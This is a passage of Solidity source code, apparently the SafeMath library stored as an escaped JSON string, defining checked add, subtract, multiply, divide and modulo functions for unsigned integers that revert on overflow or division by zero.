Solidity\u0027s `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n        // benefit is lost if \u0027b\u0027 is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts with custom message when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"}}